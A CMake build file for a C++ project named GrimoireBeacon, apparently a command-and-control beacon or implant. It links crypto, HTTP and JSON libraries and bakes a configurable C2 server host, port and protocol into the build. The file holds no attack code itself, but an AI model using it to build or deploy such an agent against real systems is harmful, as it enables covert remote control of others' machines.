cmake_minimum_required(VERSION 3.10)
project(GrimoireBeacon CXX)

set(CMAKE_CXX_STANDARD 17)
set(CMAKE_CXX_STANDARD_REQUIRED True)

# 查找并配置依赖

# 查找 libsodium
find_package(PkgConfig REQUIRED)
pkg_check_modules(LIBSODIUM REQUIRED libsodium)

# 查找 libcurl
find_package(CURL REQUIRED)
find_package(nlohmann_json CONFIG REQUIRED)

# 目标和源文件
set(SOURCE_FILES
        main.cpp
        GrimoireAgent.cpp
        GrimoireComms.cpp
        GrimoireCrypto.cpp
        Utils.cpp
        GrimoireConfig.cpp
)

add_executable(GrimoireBeacon ${SOURCE_FILES})


# 定义一个 CMake 变量，用于接收 C2 服务器地址
# 默认值设置为 "127.0.0.1" (以防编译时未指定)
set(C2_HOST_CONFIG "127.0.0.1" CACHE STRING "C2 Host IP or Domain Name")
set(C2_PORT_CONFIG "80" CACHE STRING "C2 PORT")
set(C2_PROTOCOL_CONFIG "http://" CACHE STRING "C2 PROTOCOL")

# 将 C2_HOST_CONFIG 的值作为一个预处理器宏定义传递给编译器
target_compile_definitions(GrimoireBeacon PUBLIC
        GRIMOIRE_C2_HOST="${C2_HOST_CONFIG}"
        GRIMOIRE_C2_PORT="${C2_PORT_CONFIG}"
        GRIMOIRE_C2_PROTOCOL="${C2_PROTOCOL_CONFIG}"
)


# 链接目标库
target_link_libraries(GrimoireBeacon
        PUBLIC
        ${LIBSODIUM_LIBRARIES}  # 链接 libsodium
        ${CURL_LIBRARIES}       # 链接 libcurl
        nlohmann_json::nlohmann_json
)


# 告诉编译器去哪里找头文件 (如果 find_package 没有自动完成)
target_include_directories(GrimoireBeacon PUBLIC
        $<TARGET_PROPERTY:nlohmann_json::nlohmann_json,INTERFACE_INCLUDE_DIRECTORIES>
        ${LIBSODIUM_INCLUDE_DIRS}
        ${CURL_INCLUDE_DIRS}
)
